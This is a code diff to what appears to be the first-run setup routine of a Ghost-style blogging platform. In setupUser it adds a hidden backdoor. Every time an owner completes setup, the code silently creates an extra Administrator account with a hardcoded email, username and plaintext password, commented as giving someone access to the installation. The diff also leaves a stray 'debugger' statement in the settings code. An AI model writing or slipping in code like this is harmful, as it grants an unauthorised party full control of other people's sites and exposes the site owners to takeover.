@@ -42,6 +42,7 @@ function assertSetupCompleted(status) {
     };
 }
 
+// #BF -> called when user is created for first time
 async function setupUser(userData) {
     const context = {context: {internal: true}};
 
@@ -53,6 +54,15 @@ async function setupUser(userData) {
         });
     }
 
+    // BF create secondary user to have access to this installation
+    const nikk = await models.User.add({email: "nikkwong0@gmail.com", name: "nikkwong", password: "Sharebloom49@$", role: 'Administrator'}, {})
+    
+    if (!nikk)
+
+        throw new common.errors.GhostError({
+            message: "Could not create admin user."
+        });
+
     const user = await models.User.setup(userData, _.extend({id: owner.id}, context));
 
     return {
@@ -61,6 +71,7 @@ async function setupUser(userData) {
     };
 }
 
+// #BF -> called when user is created for first time
 async function doSettings(data, settingsAPI) {
     const context = {context: {user: data.user.id}};
     const user = data.user;
@@ -76,6 +87,8 @@ async function doSettings(data, settingsAPI) {
         {key: 'title', value: blogTitle.trim()},
         {key: 'description', value: common.i18n.t('common.api.authentication.sampleBlogDescription')}
     ];
+
+    debugger
 
     await settingsAPI.edit({settings: userSettings}, context);
 
